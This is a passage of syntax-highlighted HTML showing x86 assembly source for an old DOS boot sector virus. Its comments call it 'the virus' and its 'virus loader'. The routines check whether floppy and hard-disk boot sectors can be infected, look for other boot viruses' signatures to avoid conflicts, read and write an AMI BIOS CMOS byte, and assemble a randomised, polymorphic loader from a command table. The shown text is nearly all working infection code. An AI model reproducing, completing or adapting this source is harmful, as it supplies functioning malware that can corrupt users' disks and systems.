                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; sides</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">                      </span><span class="sc1">; - 1</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">disk_here</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; while the place on the hd is stable</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">bad_fd_hd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                         </span><span class="sc1">; failure value</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">check_phys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                          </span><span class="sc1">; no check for hd</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hd_boot</span><span class="sc0">

</span><span class="sc1">; if floppy then do some consistency checks on the data in the BPB to</span><span class="sc0">
</span><span class="sc1">; be quite sure it is formatted and valid</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">       </span><span class="sc1">; bytes per sector</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_boot</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; secs on disk</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_boot</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; secs per track</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_boot</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; sides</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">bad_boot</span><span class="sc0">
</span><span class="sc5">hd_boot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1feh</span><span class="sc4">],</span><span class="sc2">0aa55h</span><span class="sc0">  </span><span class="sc1">; valid boot?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_boot</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">bad_boot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">check_vir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; try to check if it is infected by another boot virus by looking for three</span><span class="sc0">
</span><span class="sc1">; typical strings. this will prevent some conflicts with other boot viruses</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fch</span><span class="sc0">
</span><span class="sc5">vir_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_scan</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0a3h</span><span class="sc0">   </span><span class="sc1">; mov word ptr [413h],ax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">probable_one</span><span class="sc0">
</span><span class="sc5">not_this1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">   </span><span class="sc1">; dec word ptr [413h]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0eh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">probable_one</span><span class="sc0">
</span><span class="sc5">not_this2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">83h</span><span class="sc0">    </span><span class="sc1">; sub word ptr [413h],</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">2eh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_this3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">probable_one</span><span class="sc0">
</span><span class="sc5">not_this3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">vir_loop</span><span class="sc0">
</span><span class="sc5">end_scan</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; seems ok</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">probable_one</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; better leave this disk</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">read_cmos_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prep_cmos_inf</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">                  </span><span class="sc1">; read in al value of cmos</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">; byte at 2dh</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">write_cmos_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prep_cmos_inf</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; set al value to 2dh in cmos</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">prep_cmos_inf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc0">                  </span><span class="sc1">; ami bios configuration opts</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; prepare for read from cmos</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; the byte at 2dh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">make_loader</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_al</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; save input data,</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_al</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; this is the place</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_ch</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">        </span><span class="sc1">; where the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_cl</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">        </span><span class="sc1">; is placed, so what</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_cl</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; the loader must</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_dh</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">        </span><span class="sc1">; read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_dl</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_dl</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; destination mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">loader_data</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_data</span><span class="sc0">                    </span><span class="sc1">; do the virus loader</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">process_data</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get cmd from mem</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; on parameter table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">         </span><span class="sc1">; in AL the command</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; in CH parameter for command</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; select one from given table</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">select_one</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; do all the ones from given table</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">main_do_inseq</span><span class="sc0">   </span><span class="sc1">; in given order</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; copy CH bytes from given mem addr</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_chbytes</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; jump to value in BX</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">execute_on_bx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; do nothing</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">just_return</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">         </span><span class="sc1">; do all the ones from given table</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_all_seq</span><span class="sc0">      </span><span class="sc1">; in random order</span><span class="sc0">

</span><span class="sc5">corrupted_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">corrupted_loop</span><span class="sc0">    </span><span class="sc1">; else some error!</span><span class="sc0">

</span><span class="sc5">select_one</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_timer</span><span class="sc0">
</span><span class="sc5">check_sel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">sel_ok</span><span class="sc0">                  </span><span class="sc1">; select one in &lt;= max</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check_sel</span><span class="sc0">
</span><span class="sc5">sel_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">select_one</span><span class="sc0">              </span><span class="sc1">; not = 0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; * 2 for offset in mem</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; add offset to base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">process_data</span><span class="sc0">      </span><span class="sc1">; get addr and process</span><span class="sc0">

</span><span class="sc5">main_do_inseq</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">; number of entries</span><span class="sc0">
</span><span class="sc5">loop_mainseq</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_mainseq</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get adress of data to process</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">process_data</span><span class="sc0">    </span><span class="sc1">; process</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; on next one</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_mainseq</span><span class="sc0">
</span><span class="sc5">end_mainseq</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">copy_chbytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">copy_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">copy_loop</span><span class="sc0">
</span><span class="sc5">copy_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">execute_on_bx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; jump to that code</span><span class="sc0">

</span><span class="sc5">just_return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">do_all_seq</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; nr of entries</span><span class="sc0">
</span><span class="sc5">do_all_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_do_all_c0</span><span class="sc0">
</span><span class="sc5">get_one</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_timer</span><span class="sc0">
</span><span class="sc5">select_whichone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">good_sel</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">select_whichone</span><span class="sc0">
</span><span class="sc5">good_sel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; in this way each bit represents</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; one done instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; check if this one already done</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; set this as already done</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
